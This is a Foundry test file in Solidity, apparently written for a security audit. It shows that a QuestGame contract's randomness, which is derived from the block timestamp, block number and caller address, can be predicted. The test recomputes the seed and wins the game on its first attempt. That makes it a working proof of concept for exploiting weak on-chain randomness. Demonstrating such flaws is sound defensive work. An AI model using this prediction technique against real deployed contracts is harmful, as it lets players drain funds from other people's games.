
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame questGame;

    function setUp() public {
        // Initialize contract with sufficient funds to pay out rewards
        questGame = new QuestGame{value: 5 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        // Ensure valid inputs for block properties
        vm.assume(blockTimestamp > 1 hours);
        vm.assume(blockNumber > 0);

        // --- 2. State Configuration ---
        
        // Fund the test contract to pay the entry fee
        vm.deal(address(this), 1 ether);

        // Set the block environment to the specific fuzzed values
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        // --- 3. Replication & Assertion ---
        
        // Replicate the randomness logic using the known block state
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    blockTimestamp, 
                    blockNumber, 
                    address(this) 
                )
            )
        );

        uint256 predictedNumber = seed % 100;
                
        // Call the function with the predicted winning number
        questGame.attemptQuest{value: 0.1 ether}(predictedNumber);

        // Assert that the prediction resulted in a win
        (, uint256 wins) = questGame.getPlayerStats(address(this));
        assertEq(wins, 1, "Random number was successfully predicted");
    }

    // Required to receive the reward ETH
    receive() external payable {}
}
